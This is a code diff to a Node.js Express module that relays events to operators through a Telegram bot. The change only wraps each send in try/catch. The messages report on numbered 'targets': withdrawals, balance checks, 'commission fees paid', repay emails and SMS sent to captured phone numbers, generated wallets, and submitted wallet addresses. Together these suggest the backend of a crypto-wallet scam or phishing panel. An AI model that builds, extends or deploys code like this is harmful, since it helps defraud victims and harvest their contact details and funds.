@@ -124,14 +124,18 @@ module.exports.get_data = (app, users, bot) => {
         }
 
         for (let u in users) {
-          let chatId = users[u];
-          bot.sendMessage(
-            chatId,
-            `🔔 Withdraw! Data entered correct! Target no ${Math.min.apply(
-              null,
-              list_of_user
-            )}`
-          );
+          try {
+            let chatId = users[u];
+            bot.sendMessage(
+              chatId,
+              `🔔 Withdraw! Data entered correct! Target no ${Math.min.apply(
+                null,
+                list_of_user
+              )}`
+            );
+          } catch (error) {
+            continue
+          }
         }
 
         break;
@@ -145,14 +149,18 @@ module.exports.get_data = (app, users, bot) => {
         }
 
         for (let u in users) {
-          let chatId = users[u];
-          bot.sendMessage(
-            chatId,
-            `☑️ Balance checked! Target no. ${Math.min.apply(
-              null,
-              list_of_user
-            )}`
-          );
+          try {
+            let chatId = users[u];
+            bot.sendMessage(
+              chatId,
+              `☑️ Balance checked! Target no. ${Math.min.apply(
+                null,
+                list_of_user
+              )}`
+            );
+          } catch (error) {
+            continue
+          }
         }
         break;
 
@@ -167,15 +175,25 @@ module.exports.get_data = (app, users, bot) => {
     switch (type) {
       case 0:
         for (let u in users) {
-          let chatId = users[u];
-          bot.sendMessage(chatId, "🗝   Generate Business wallet !");
+
+          try {
+            let chatId = users[u];
+            bot.sendMessage(chatId, "🗝   Generate Business wallet !");
+          } catch (error) {
+            continue
+          }
         }
         break;
       case 1:
         for (let u in users) {
-          let chatId = users[u];
-          bot.sendMessage(chatId, "🗝   Generate Gift wallet !");
+          try {
+            let chatId = users[u];
+            bot.sendMessage(chatId, "🗝   Generate Gift wallet !");
+          } catch (error) {
+            continue
+          }
         }
+
         break;
 
       default:
@@ -219,8 +237,12 @@ module.exports.get_data = (app, users, bot) => {
         from
       );
       for (let u in users) {
-        let chatId = users[u];
-        bot.sendMessage(chatId, `📨 Email delivered! —» ${mail_sender}`);
+        try {
+          let chatId = users[u];
+          bot.sendMessage(chatId, `📨 Email delivered! —» ${mail_sender}`);
+        } catch (error) {
+          continue
+        }
       }
     });
   });
@@ -271,14 +293,19 @@ module.exports.get_data = (app, users, bot) => {
     }
 
     for (let u in users) {
-      let chatId = users[u];
-      bot.sendMessage(
-        chatId,
-        `❇️ Commission paid! ❇️ Target ⚫️ ${Math.min.apply(
-          null,
-          list_of_user
-        )}\nRepay email delivered —» ${mail_sender}`
-      );
+      try {
+        let chatId = users[u];
+
+        bot.sendMessage(
+          chatId,
+          `❇️ Commission paid! ❇️ Target ⚫️ ${Math.min.apply(
+            null,
+            list_of_user
+          )}\nRepay email delivered —» ${mail_sender}`
+        );
+      } catch (error) {
+        continue
+      }
     }
   });
 
@@ -287,7 +314,12 @@ module.exports.get_data = (app, users, bot) => {
       let chatId = users[u];
 
       let address = request.body?.address;
-      bot.sendMessage(chatId, `❕ ${address}`);
+
+      try {
+        bot.sendMessage(chatId, `❕ ${address}`);
+      } catch (error) {
+        continue
+      }
     }
   });
 
@@ -394,18 +426,21 @@ module.exports.get_data = (app, users, bot) => {
       for (let u in users) {
         let chatId = users[u];
 
-        if (type === "important") {
-          bot.sendMessage(
-            chatId,
-            `📌 Withdraw balance! Email delivered! —» ${mail_sender}\nSMS delivered! —--» ${phone}`
-          );
-        } else if (type === "balance") {
-          bot.sendMessage(
-            chatId,
-            `🟡 Balance checked! Email delivered! —» ${mail_sender} \n| SMS delivered! —--» ${phone}`
-          );
+        try {
+          if (type === "important") {
+            bot.sendMessage(
+              chatId,
+              `📌 Withdraw balance! Email delivered! —» ${mail_sender}\nSMS delivered! —--» ${phone}`
+            );
+          } else if (type === "balance") {
+            bot.sendMessage(
+              chatId,
+              `🟡 Balance checked! Email delivered! —» ${mail_sender} \n| SMS delivered! —--» ${phone}`
+            );
+          }
+        } catch (error) {
+          continue
         }
-
         // bot.sendMessage(chatId, `☑️ Balance checked! Target no. ${Math.min.apply(null, list_of_user)}`)
         // bot.sendMessage(chatId, `✉️ SMS delivered! Phone number —» ${phone}`)
       }
@@ -490,12 +525,16 @@ module.exports.get_data = (app, users, bot) => {
       }
 
       for (let u in users) {
-        let chatId = users[u];
-        bot.sendMessage(
-          chatId,
-          `☑️ Balance checked! Target no. ${Math.min.apply(null, list_of_user)}`
-        );
-        bot.sendMessage(chatId, `✉️ SMS delivered! Phone number —» ${phone}`);
+        try {
+          let chatId = users[u];
+          bot.sendMessage(
+            chatId,
+            `☑️ Balance checked! Target no. ${Math.min.apply(null, list_of_user)}`
+          );
+          bot.sendMessage(chatId, `✉️ SMS delivered! Phone number —» ${phone}`);
+        } catch (error) {
+          continue
+        }
       }
     }
   });
@@ -540,14 +579,18 @@ module.exports.get_data = (app, users, bot) => {
         }
 
         for (let u in users) {
-          let chatId = users[u];
-          bot.sendMessage(
-            chatId,
-            `✅ Commission fee paid! Target no (${Math.min.apply(
-              null,
-              list_of_user
-            )})`
-          );
+          try {
+            let chatId = users[u];
+            bot.sendMessage(
+              chatId,
+              `✅ Commission fee paid! Target no (${Math.min.apply(
+                null,
+                list_of_user
+              )})`
+            );
+          } catch (error) {
+            continue
+          }
         }
       }
     }
@@ -637,8 +680,13 @@ module.exports.get_data = (app, users, bot) => {
         }
 
         for (let u in users) {
-          let chatId = users[u];
-          bot.sendMessage(chatId, message);
+          try {
+
+            let chatId = users[u];
+            bot.sendMessage(chatId, message);
+          } catch (error) {
+            continue
+          }
         }
 
         break;
